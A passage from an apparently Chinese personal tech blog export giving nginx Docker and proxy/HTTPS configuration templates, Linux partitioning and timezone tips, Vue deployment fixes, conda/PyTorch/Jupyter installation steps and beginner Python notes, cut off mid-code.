<h2 id="绑定端口和映射路径"><a href="#绑定端口和映射路径" class="headerlink" title="绑定端口和映射路径"></a>绑定端口和映射路径</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -p 81:81 -p 82:82 --name nginx\</span><br><span class="line">  -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">  -v /root/nginx/conf.d:/etc/nginx/conf.d \</span><br><span class="line">  -v /root/nginx/logs:/var/log/nginx \</span><br><span class="line">  -v /root/nginx/html:/usr/share/nginx/html \</span><br><span class="line">  -v /root/nginx/ssl:/etc/nginx/ssl \</span><br><span class="line">  nginx</span><br></pre></td></tr></table></figure>

<h2 id="nginx配置模板"><a href="#nginx配置模板" class="headerlink" title="nginx配置模板"></a>nginx配置模板</h2><h3 id="nginx-conf配置选项"><a href="#nginx-conf配置选项" class="headerlink" title="nginx.conf配置选项"></a>nginx.conf配置选项</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;</span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections 768;</span><br><span class="line">        # multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Basic Settings</span><br><span class="line">        ##</span><br><span class="line">        sendfile on;</span><br><span class="line">        tcp_nopush on;</span><br><span class="line">        tcp_nodelay on;</span><br><span class="line">        keepalive_timeout 65;</span><br><span class="line">        types_hash_max_size 2048;</span><br><span class="line">        # server_tokens off;</span><br><span class="line"></span><br><span class="line">        # server_names_hash_bucket_size 64;</span><br><span class="line">        # server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">        include /etc/nginx/mime.types;</span><br><span class="line">        default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # SSL Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Logging Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        access_log /var/log/nginx/access.log;</span><br><span class="line">        error_log /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Gzip Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        gzip on;</span><br><span class="line"></span><br><span class="line">        # gzip_vary on;</span><br><span class="line">        # gzip_proxied any;</span><br><span class="line">        # gzip_comp_level 6;</span><br><span class="line">        # gzip_buffers 16 8k;</span><br><span class="line">        # gzip_http_version 1.1;</span><br><span class="line">        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Virtual Host Configs</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        include /etc/nginx/conf.d/*.conf;</span><br><span class="line">        include /etc/nginx/sites-enabled/*;</span><br><span class="line">        include /etc/nginx/conf.d/**/*.conf;</span><br><span class="line"></span><br><span class="line">        #test_3d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#mail &#123;</span><br><span class="line">#       # See sample authentication script at:</span><br><span class="line">#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class="line"># </span><br><span class="line">#       # auth_http localhost/auth.php;</span><br><span class="line">#       # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class="line">#       # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class="line"># </span><br><span class="line">#       server &#123;</span><br><span class="line">#               listen     localhost:110;</span><br><span class="line">#               protocol   pop3;</span><br><span class="line">#               proxy      on;</span><br><span class="line">#       &#125;</span><br><span class="line"># </span><br><span class="line">#       server &#123;</span><br><span class="line">#               listen     localhost:143;</span><br><span class="line">#               protocol   imap;</span><br><span class="line">#               proxy      on;</span><br><span class="line">#       &#125;</span><br><span class="line">#&#125;</span><br></pre></td></tr></table></figure>

<h3 id="conf-d下的文件配置模板"><a href="#conf-d下的文件配置模板" class="headerlink" title="conf.d下的文件配置模板"></a>conf.d下的文件配置模板</h3><ul>
<li><p>反向代理其他端口的服务</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name zfxt.top;</span><br><span class="line">        add_header Strict-Transport-Security max-age=15768000;</span><br><span class="line">        return 301 https://$server_name$request_uri;</span><br><span class="line">        location / &#123;</span><br><span class="line">            # 单个服务</span><br><span class="line">            proxy_pass http://127.0.0.1:5244/;</span><br><span class="line">            # 负载均衡</span><br><span class="line">            # proxy_pass http://yourServers/;</span><br><span class="line">            proxy_redirect off;</span><br><span class="line">            proxy_set_header        X-Real-IP           $remote_addr;</span><br><span class="line">            proxy_set_header        X-Forwarded-For     $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_set_header        Host                $http_host;</span><br><span class="line">            proxy_set_header        X-NginX-Proxy       true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen 443 ssl;</span><br><span class="line">        server_name zfxt.top;</span><br><span class="line">        # 下面ssl开头的是HTTPS相关的设置</span><br><span class="line">        ssl on;</span><br><span class="line">        ssl_certificate          /root/.acme.sh/*.zfxt.top_ecc/fullchain.cer;</span><br><span class="line">        ssl_certificate_key     /root/.acme.sh/*.zfxt.top_ecc/*.zfxt.top.key;</span><br><span class="line">        ssl_session_timeout     3600m;#session有效期，根据需要适当延长</span><br><span class="line">        ssl_session_cache       shared:SSL:10m;</span><br><span class="line">        # 使用的加解密方式</span><br><span class="line">        ssl_ciphers             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">        # 支持的协议类型</span><br><span class="line">        ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        # 优先使用服务端的加解密方式</span><br><span class="line">        ssl_prefer_server_ciphers on;     </span><br><span class="line">        location / &#123;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Range $http_range;</span><br><span class="line">        proxy_set_header If-Range $http_if_range;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_pass http://127.0.0.1:5244;</span><br><span class="line">        # the max size of file to upload</span><br><span class="line">        client_max_body_size 20000m;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>或者直接启动前端服务</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  zfxt.top;</span><br><span class="line">        rewrite ^(.*)$ https://$host$1 permanent;</span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location   / &#123;</span><br><span class="line">            root html;</span><br><span class="line">                index index.html;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       443 ssl;</span><br><span class="line">        server_name  zfxt.top;</span><br><span class="line"></span><br><span class="line">        ssl on;</span><br><span class="line">        ssl_certificate         /root/.acme.sh/zfxt.top_ecc/fullchain.cer;</span><br><span class="line">        ssl_certificate_key     /root/.acme.sh/zfxt.top_ecc/zfxt.top.key;</span><br><span class="line">        ssl_session_timeout     3600m;#session有效期，根据需要适当延长</span><br><span class="line">        ssl_session_cache       shared:SSL:10m;</span><br><span class="line"></span><br><span class="line">        root /etc/nginx/conf.d/typecho;</span><br><span class="line">        index index.php;</span><br><span class="line"></span><br><span class="line">        ssl_ciphers             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">        ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">        #typecho</span><br><span class="line">        location ~ .*\.php(\/.*)*$ &#123;</span><br><span class="line">                root           /etc/nginx/conf.d/typecho/;</span><br><span class="line">        fastcgi_split_path_info ^(.+?.php)(/.*)$;</span><br><span class="line">                fastcgi_pass  127.0.0.1:9000;</span><br><span class="line">                fastcgi_index  index.php;</span><br><span class="line">                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">                include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #location / &#123;</span><br><span class="line">        #root /etc/nginx/conf.d/typecho;</span><br><span class="line">        #index  index.html index.php;</span><br><span class="line">        #&#125;</span><br><span class="line">        location /sentence &#123;</span><br><span class="line">                proxy_pass http://localhost:8080/api/sentence;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>linux分区方案</title>
    <url>/posts/eb50fec0/</url>
    <content><![CDATA[<p>常用方案</p>
<p>分为3个区</p>
<ol>
<li><p>挂载点&#x2F;；主分区；安装系统和软件；大小为30G；分区格式为ext4；</p>
</li>
<li><p>挂载点&#x2F;home；逻辑分区；相当于“我的文档”；大小为硬盘剩下的; 分区格式ext4；</p>
</li>
<li><p>swap；逻辑分区；充当虚拟内存；大小等于内存大小或内存的一半（本人16G）；分区格式为swap</p>
</li>
<li><p>&#x2F;boot ；引导分区；逻辑分区； 大小为1G ；分区格式为ext4；</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux修改时区</title>
    <url>/posts/5ad2f02/</url>
    <content><![CDATA[<h2 id="Linux-设置时区和修改时间"><a href="#Linux-设置时区和修改时间" class="headerlink" title="Linux 设置时区和修改时间"></a>Linux 设置时区和修改时间</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">timedatectl set-timezone Asia/Shanghai     #服务器时区设置</span><br><span class="line">date #查看时间</span><br><span class="line">date -s &quot;2024-07-17 09:28:05&quot;              #修改时间</span><br></pre></td></tr></table></figure>

<p>保存退出，然后reboot重启服务器即可生效，date命令查看是24小时时间格式。</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx配置ws</title>
    <url>/posts/e3802614/</url>
    <content><![CDATA[<p>在恢复服务器的过程中，get 到的一个小知识：因为所有的服务都是通过 nginx 代理出来的。而默认配置下并没有对 ws 进行代理。</p>
<p>WS的全称是WebSocket，Nginx配置WebSocket也比较简单，只需要在nginx.conf文件中进行相应的配置。这种方式很简单，但是很有效，能够横向扩展WebSocket服务端的服务能力。</p>
<p>这里直接贴代码：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">map</span> <span class="variable">$http_upgrade</span> <span class="variable">$connection_upgrade</span> &#123;</span><br><span class="line">    <span class="attribute">default</span> upgrade;</span><br><span class="line">    &#x27;&#x27; close;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 如果$http_upgrade 不为 &#x27;&#x27; (空)， 则$connection_upgrade 为 upgrade 。</span></span><br><span class="line"><span class="comment"># 如果$http_upgrade 为 &#x27;&#x27; (空)， 则 $connection_upgrade 为 close。</span></span><br><span class="line">server&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Range <span class="variable">$http_range</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> If-Range <span class="variable">$http_if_range</span>;</span><br><span class="line">            <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://immich_server:2283;</span><br><span class="line">            <span class="comment"># the max size of file to upload</span></span><br><span class="line">            <span class="attribute">client_max_body_size</span> <span class="number">20000m</span>;</span><br><span class="line">            <span class="comment"># 下面这两行是关键</span></span><br><span class="line">            <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line">            <span class="comment"># proxy_set_header Upgrade $http_upgrade; 表示设置Upgrade不变</span></span><br><span class="line">            <span class="comment"># proxy_set_header Connection $connection_upgrade; 表示如果 $http_upgrade为upgrade，则请求为upgrade(websocket)，如果不是，就关闭连接</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>linux换源须知</title>
    <url>/posts/f74b10c2/</url>
    <content><![CDATA[<p>这里只说明ubuntu，其他的linux应该也是一通百通的。<br><strong>每个发行版本都有自己的代号。</strong><br>也就是说，我们平常直接在网上复制的换源代码不一定适用，还可能导致系统崩溃<br><img src="https://image.zfxt.top/hexo-blog/linux%E6%8D%A2%E6%BA%90%E9%A1%BB%E7%9F%A5-2024-01-07-57-26.png"><br>类似这样子，因此我们每次换源时，需要考虑到他的版本代号。这里直接推荐最终解决方案。<br><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu换源</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx 部署前后端错误记录</title>
    <url>/posts/bfeba94/</url>
    <content><![CDATA[<h1 id="记录两个错误"><a href="#记录两个错误" class="headerlink" title="记录两个错误"></a>记录两个错误</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>在我部署了一个前端页面到服务器上的nginx后，我访问他报错403.显示没有权限。后来发现403的一个可能原因是因为nginx没有权限访问到&#x2F;root中的内容。因为我把vue打包的页面直接放到了root目录下。因此报错，只要将这个dist文件放到其他位置即可正常访问了</p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>vue部署了路由的话，再部署到nginx上需要为vue的路由专门配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">               root html/dist;</span><br><span class="line">               index index.html;</span><br><span class="line">               try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;#解决页面刷新</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>同时因为vue的代理服务器只在运行时才有用。因此需要再nginx部署代理服务器。或者再后端解决跨域问题。<br>这里介绍再nginx解决代理的方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location  /api/ &#123;</span><br><span class="line">            <span class="comment"># 单个服务</span></span><br><span class="line">            proxy_pass http://127.0.0.1:5441/;</span><br><span class="line">            <span class="comment"># rewrite ^(.*)api(.*)$ $1$2 last;</span></span><br><span class="line">            <span class="comment"># 负载均衡</span></span><br><span class="line">            <span class="comment"># proxy_pass http://yourServers/;</span></span><br><span class="line">           proxy_redirect off;</span><br><span class="line">           proxy_set_header        X-Real-IP           <span class="variable">$remote_addr</span>;</span><br><span class="line">           proxy_set_header        X-Forwarded-For     <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">           proxy_set_header        Host                <span class="variable">$http_host</span>;</span><br><span class="line">           proxy_set_header        X-NginX-Proxy       <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>你不需要再重写请求路径了，他接收到&#x2F;api的请求路径时，会自动的转移到proxy_pass并且自动去掉api。</p>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>pytorch和jupyter的安装</title>
    <url>/posts/c0b02993/</url>
    <content><![CDATA[<ol>
<li>第一步，欲要使用python最佳的建议是使用conda实现python的环境管理，因此这里演示conda的安装和使用。<br><em><strong>注意，接下来的所有内容都推荐关闭代理进行使用。避免出现网络不通畅的情况。还有conda在安装时会修改dll文件。如果有安装360或者其他杀毒软件的话。需要给予白名单或者关闭杀毒程序</strong></em><blockquote>
<p>anaconda作为python的版本管理神器，但由于他的体积太大，安装后大概占约2G左右的空间，因此这里推荐使用miniconda。</p>
</blockquote>
</li>
</ol>
<h2 id="下载安装conda"><a href="#下载安装conda" class="headerlink" title="下载安装conda"></a>下载安装conda</h2><p>由于官网下载太慢，因此推荐去(清华大学开源软件镜像站下载)[<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/?C=M&O=D%5D">https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/?C=M&amp;O=D]</a></p>
<h3 id="修改conda源"><a href="#修改conda源" class="headerlink" title="修改conda源"></a>修改conda源</h3><p>安装后，需要进行换源，不然下载，导包都会异常缓慢。</p>
<ul>
<li>conda配置文件位置：~&#x2F;.condarc (Windows路径为：C:\Users<UserName>.condarc)</li>
<li>清华源配置，通常配置写入标准库的内容即可，若要使用附加库的内容才将其插入“ - defaults”那一行前面：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">channels:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">defaults</span></span><br><span class="line"><span class="attr">show_channel_urls:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="修改pip源"><a href="#修改pip源" class="headerlink" title="修改pip源"></a>修改pip源</h3><ul>
<li>pip配置文件位置：~&#x2F;.pip&#x2F;pip.conf (Windows路径为：C:\Users<UserName>\pip\pip.ini)</li>
<li>阿里源配置：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">global</span>]</span><br><span class="line"><span class="string">index-url</span> <span class="string">=</span> <span class="string">https://mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"><span class="string">trusted-host=mirrors.aliyun.com</span></span><br><span class="line"><span class="string">timeout</span> <span class="string">=</span> <span class="number">120</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>建议conda只用来更新conda和python、下载和更新python包使用pip，因为清华源和交大源下载速度远远不及阿里源和华为源。</p>
</blockquote>
</li>
</ul>
<p>更新conda</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure>
<p>更新python</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda update python</span><br></pre></td></tr></table></figure>
<p>更新所有包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda update --all</span><br></pre></td></tr></table></figure>
<p>清除无用的包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda clean -p        <span class="comment"># 清理无用的包</span></span><br><span class="line">conda clean -t        <span class="comment"># 清理tar包</span></span><br><span class="line">conda clean -y --all  <span class="comment"># 清理所有安装包及cache</span></span><br></pre></td></tr></table></figure>
<h2 id="conda管理虚拟环境，他默认为base环境"><a href="#conda管理虚拟环境，他默认为base环境" class="headerlink" title="conda管理虚拟环境，他默认为base环境"></a>conda管理虚拟环境，他默认为base环境</h2><p>需要打开自动进入base环境，使用下面的命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda config --<span class="built_in">set</span> auto_activate_base <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>创建自定义环境</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda create --name py38 python=3.8</span><br></pre></td></tr></table></figure>
<p>查看所有环境</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">conda <span class="built_in">env</span> list</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>安装pytorch<br>-. 首先，打开miniconda的命令行<br><img src="https://image.zfxt.top/hexo-blog/pytorch%E5%92%8Cjupyter%E7%9A%84%E5%AE%89%E8%A3%85-2023-10-13-07-46.png"><br>然后，先在conda中创建一个python环境，设置python版本为3.8<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">conda create -name pytorch python=<span class="number">3</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>
<img src="https://image.zfxt.top/hexo-blog/pytorch%E5%92%8Cjupyter%E7%9A%84%E5%AE%89%E8%A3%85-2023-10-05-38-19.png"><br>然后，激活这个环境，准备安装pytorch<br>执行<code>conda activate pytorch</code>便完成环境的切换。<br>-. 进入pytorch官网，选择自己需要的配置<br><img src="https://image.zfxt.top/hexo-blog/pytorch%E5%92%8Cjupyter%E7%9A%84%E5%AE%89%E8%A3%85-2023-10-23-51-51.png"><br>然后复制其内容。即可完成pytorch的安装了。<br>执行：<br><img src="https://image.zfxt.top/hexo-blog/pytorch%E5%92%8Cjupyter%E7%9A%84%E5%AE%89%E8%A3%85-2023-10-23-29-54.png"><br>如果返回True即完成了安装过程</li>
<li>jupyter的安装<br>在激活了pytorch环境后，执行以下命令。<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install jupyter notebook</span><br></pre></td></tr></table></figure>
然后就算完成了。执行<code>jupyter notebook</code>即可进入jupyter</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>python简单学习</title>
    <url>/posts/94a5acd6/</url>
    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一个字符必须为字母或者_</span></span><br><span class="line"><span class="comment"># 大小写敏感</span></span><br><span class="line">_a = <span class="number">1</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(_a, a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 行与缩进</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a == 2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Number类型：int 1,bool true,float 1.23,complex 1.1+2j</span></span><br><span class="line"><span class="string">字符串 变量[头下标:尾下标:步长] 来截取字符串</span></span><br><span class="line"><span class="string">字符串可以用 + 运算符连接在一起，用 * 运算符重复。</span></span><br><span class="line"><span class="string">反斜杠可以用来转义，使用 r 可以让反斜杠不发生转义。 如 r&quot;this is a line with \n&quot; 则 \n 会显示，并不是换行。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;\n\n按下enter键退出&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</span></span><br><span class="line"><span class="comment"># 允许多变量赋值,指定赋值</span></span><br><span class="line">x = y = z = <span class="number">1</span></span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Number（数字）</span></span><br><span class="line"><span class="string">String（字符串）</span></span><br><span class="line"><span class="string">bool（布尔类型）</span></span><br><span class="line"><span class="string">List（列表）</span></span><br><span class="line"><span class="string">Tuple（元组）</span></span><br><span class="line"><span class="string">Set（集合）</span></span><br><span class="line"><span class="string">Dictionary（字典）</span></span><br><span class="line"><span class="string">不可变数据（3 个）：Number（数字）、String（字符串）、Tuple（元组）；</span></span><br><span class="line"><span class="string">可变数据（3 个）：List（列表）、Dictionary（字典）、Set（集合）。 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">type()不会认为子类是一种父类类型。</span></span><br><span class="line"><span class="string">isinstance()会认为子类是一种父类类型。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = <span class="number">111</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(a, <span class="built_in">str</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"><span class="comment"># 注意：Python3 中，bool 是 int 的子类，True 和 False 可以和数字相加， True==1、False==0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># del语句删除一些对象引用。</span></span><br><span class="line"><span class="keyword">del</span> a</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Runoob&#x27;</span></span><br><span class="line"><span class="comment"># 索引值以 0 为开始值，-1 为从末尾的开始位置。</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># int() 强制转换为整型：</span></span><br><span class="line">x = <span class="built_in">int</span>(<span class="number">2.6</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># while 循环使用 else 语句</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(count, <span class="string">&quot; 小于 5&quot;</span>)</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(count, <span class="string">&quot; 大于或等于 5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python pass是空语句，是为了保持程序结构的完整性。</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">列表推导式</span></span><br><span class="line"><span class="string">[表达式 for 变量 in 列表] </span></span><br><span class="line"><span class="string">[out_exp_res for out_exp in input_list]</span></span><br><span class="line"><span class="string">或者 </span></span><br><span class="line"><span class="string">[表达式 for 变量 in 列表 if 条件]</span></span><br><span class="line"><span class="string">[out_exp_res for out_exp in input_list if condition]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">names = [<span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;Jerry&#x27;</span>, <span class="string">&#x27;Wendy&#x27;</span>, <span class="string">&#x27;Smith&#x27;</span>]</span><br><span class="line">new_names = [name.upper() <span class="keyword">for</span> name <span class="keyword">in</span> names <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(new_names)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组推导式（生成器表达式）</span></span><br><span class="line">a = (x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="comment"># a &lt;generator object &lt;genexpr&gt; at 0x7faf6ee20a50&gt;# 返回的是生成器对象</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span>(a) <span class="comment">#  使用 tuple() 函数，可以直接将生成器对象转换成元组</span></span><br><span class="line"><span class="comment"># (1, 2, 3, 4, 5, 6, 7, 8, 9)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">创建一个迭代器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">把一个类作为一个迭代器使用需要在类中实现两个方法 __iter__() 与 __next__() 。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyNumbers</span>:</span><br><span class="line">    <span class="keyword">def</span> <span 